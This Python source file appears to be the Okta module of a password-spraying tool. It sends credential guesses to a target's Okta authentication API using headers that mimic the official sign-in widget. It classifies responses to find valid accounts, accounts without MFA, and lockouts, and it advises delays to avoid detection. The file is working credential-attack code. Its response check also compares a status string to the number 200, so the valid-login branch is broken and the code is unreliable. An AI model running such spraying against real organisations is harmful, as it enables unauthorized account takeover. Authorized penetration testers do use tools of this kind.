import logging
from contextlib import suppress
from .base import BaseSprayModule
from ..util import highlight_json

log = logging.getLogger('trevorspray.sprayers.okta')

class Okta(BaseSprayModule):

    # default target URL
    default_url = 'https://{subdomain}.okta.com/api/v1/authn'

    request_json = {
        'options': {
            'warnBeforePasswordExpired': True,
            'multiOptionalFactorEnroll': True
        }
    }

    headers = {
        'X-Requested-With': 'XMLHttpRequest',
        'X-Okta-User-Agent-Extended': 'okta-signin-widget-5.14.1',
        'Accept': 'application/json',
        'Content-Type': 'application/json',
    }

    def initialize(self):

        if not self.trevor.options.delay or self.trevor.options.jitter:
            log.warning(f'Okta hides lockout failures by default! --delay is recommended.')

        while not self.runtimeparams.get('subdomain', ''):
            self.runtimeparams.update({
                'subdomain': input('Enter target subdomain (<subdomain>.okta.com): ').strip()
            })

        return True

    def check_response(self, response):

        valid = False
        exists = None
        locked = None
        msg = ''

        json = {}
        with suppress(Exception):
            json = response.json()

        status = json.get('status', json.get('errorSummary', 'Unknown'))
        msg = f'[{status}] (Response code {response.status_code})'

        if status == 200 and 'status' in json:
            if status == 'LOCKED_OUT':
                locked = True
            else:
                exists = True
                valid = True
                if status == 'MFA_ENROLL':
                    msg = f'[{status}] Valid credentials without MFA!\n{highlight_json(json)}'
                else:
                    msg = f'[{status}] Valid credentials!\n{highlight_json(json)}'

        return (valid, exists, locked, msg)
